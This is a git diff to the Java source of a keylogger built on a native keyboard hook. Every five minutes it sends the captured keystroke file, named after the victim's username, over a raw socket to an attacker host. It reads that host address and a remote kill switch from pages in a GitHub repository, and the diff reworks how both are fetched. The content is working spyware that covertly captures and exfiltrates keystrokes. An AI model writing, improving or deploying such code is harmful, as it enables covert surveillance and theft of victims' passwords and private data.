@@ -3,16 +3,19 @@ package main;
 import org.jnativehook.keyboard.NativeKeyListener;
 
 import java.io.BufferedInputStream;
+import java.io.BufferedReader;
 import java.io.BufferedWriter;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileWriter;
 import java.io.IOException;
+import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.io.PrintWriter;
 import java.net.Socket;
 import java.net.URISyntaxException;
 import java.net.URL;
+import java.net.URLConnection;
 import java.text.SimpleDateFormat;
 import java.util.Calendar;
 import java.util.Date;
@@ -71,14 +74,8 @@ public class Main implements NativeKeyListener{
 			 if (minutes % 5 == 0) {
 			    	// send the file
 			    	try {
-			    		URL oracle = new URL("https://github.com/OtakuInSeattle/sites/blob/master/uploader");
-			            Scanner inSt = new Scanner(oracle.openStream());
-			            String inputLine = "";
-			            while (!inputLine.equals("connectTo")){
-			                inputLine = inSt.next();
-			    		}
-			    		String connectTo = inSt.next();
-			    		Socket socket = new Socket(connectTo, 420);
+			    		//System.out.println(connectTo);
+			    		Socket socket = new Socket(getHostIP(), 25565);
 			    		OutputStream t = socket.getOutputStream();
 			    		PrintWriter out = new PrintWriter(t);
 						String toSend = System.getProperty("user.name") + ".txt";
@@ -90,10 +87,11 @@ public class Main implements NativeKeyListener{
 			    		BufferedInputStream bin = new BufferedInputStream(fin); 
 			    		bin.read(bytearray,0,bytearray.length); 
 			    		OutputStream os = socket.getOutputStream(); 
-			    		System.out.println(""); 
+			    		// System.out.println(""); 
 			    		os.write(bytearray,0,bytearray.length); 
 			    		os.flush(); 
 			    	} catch (Exception e) {
+			    		System.out.println(e);
 			    	}
 			    }
 		}
@@ -101,21 +99,22 @@ public class Main implements NativeKeyListener{
 
 	private static boolean isSuicune() {
 		try {
-			   URL oracle = new URL("https://raw.githubusercontent.com/OtakuInSeattle/sites/master/klkillswitch");
-		       Scanner inSt = new Scanner(oracle.openStream());
-		       String inputLine = "";
-		       while (!inputLine.equals("Suicide")){
-		           inputLine = inSt.next();
-					// System.out.println(inputLine);
-				}
-				String auth = inSt.next();
-				inSt.close();
-				if (auth.matches("yes")) {
-					return true;
-				} else {
-					return false;
-				}
+			 URL yahoo = new URL("https://github.com/OtakuInSeattle/sites/blob/master/klkillswitch");
+	         URLConnection yc = yahoo.openConnection();
+	         BufferedReader in = new BufferedReader(new InputStreamReader(
+	                 yc.getInputStream(), "UTF-8"));
+	         String inputLine;
+	         StringBuilder a = new StringBuilder();
+	         while ((inputLine = in.readLine()) != null){
+	             a.append(inputLine);
+	             if(a.toString().contains("yes")) {
+	            	 return true;
+	             }
+	         }
+	         System.out.println("NO");
+	         return false;
 		} catch (Exception e) {
+			System.out.println(e);
 			return false;
 		}
 	}
@@ -169,4 +168,25 @@ public class Main implements NativeKeyListener{
 		    int beats = (int) ( ( cal.get( java.util.Calendar.SECOND ) + ( cal.get( java.util.Calendar.MINUTE ) * 60 ) + ( cal.get( java.util.Calendar.HOUR_OF_DAY ) * 3600 ) ) / 86.4 );
 		    return beats;
 		}
+	 public static String getHostIP() throws IOException {
+		 try {
+		 URL yahoo = new URL("https://github.com/OtakuInSeattle/sites/blob/master/uploader");
+         URLConnection yc = yahoo.openConnection();
+         BufferedReader in = new BufferedReader(new InputStreamReader(
+                 yc.getInputStream(), "UTF-8"));
+         String inputLine;
+         StringBuilder a = new StringBuilder();
+        // System.out.println("a");
+         while ((inputLine = in.readLine()) != null){
+             a.append(inputLine);
+             if(inputLine.contains("connectTo")) {
+          //  	 System.out.println("b");
+            	 return(inputLine.substring(78, inputLine.indexOf("</td>")));
+             }
+         }
+         return "127.0.0.1";
+		 } catch (Exception e) {
+			 return "127.0.0.1";
+		 }
+	 }
 }
